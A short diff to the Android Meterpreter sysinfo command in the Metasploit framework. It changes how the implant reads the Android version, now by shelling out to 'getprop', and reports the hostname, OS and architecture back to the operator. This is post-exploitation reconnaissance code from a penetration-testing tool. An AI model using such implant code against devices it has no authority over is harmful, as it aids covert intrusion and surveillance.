@@ -5,6 +5,7 @@ import java.net.InetAddress;
 import com.metasploit.meterpreter.Meterpreter;
 import com.metasploit.meterpreter.TLVPacket;
 import com.metasploit.meterpreter.TLVType;
+import com.metasploit.meterpreter.Utils;
 import com.metasploit.meterpreter.command.Command;
 import com.metasploit.meterpreter.stdapi.stdapi_sys_config_sysinfo;
 
@@ -15,15 +16,11 @@ public class stdapi_sys_config_sysinfo_android extends
 
     public int execute(Meterpreter meterpreter, TLVPacket request,
                        TLVPacket response) throws Exception {
-
-        String androidOS = Build.VERSION.RELEASE;
-
-        response.add(TLVType.TLV_TYPE_COMPUTER_NAME, InetAddress.getLocalHost()
-                .getHostName());
-        response.add(TLVType.TLV_TYPE_OS_NAME,
-                "Android " + androidOS + " - " + System.getProperty("os.name")
-                        + " " + System.getProperty("os.version") + " ("
-                        + System.getProperty("os.arch") + ")");
+        String androidOS = Utils.runCommand("getprop ro.build.version.release").replace("\n", "");
+        response.add(TLVType.TLV_TYPE_COMPUTER_NAME, InetAddress.getLocalHost().getHostName());
+        response.add(TLVType.TLV_TYPE_OS_NAME, "Android " + androidOS
+                + " - " + System.getProperty("os.name")
+                + " " + System.getProperty("os.version") + " (" + System.getProperty("os.arch") + ")");
         return ERROR_SUCCESS;
     }
 }
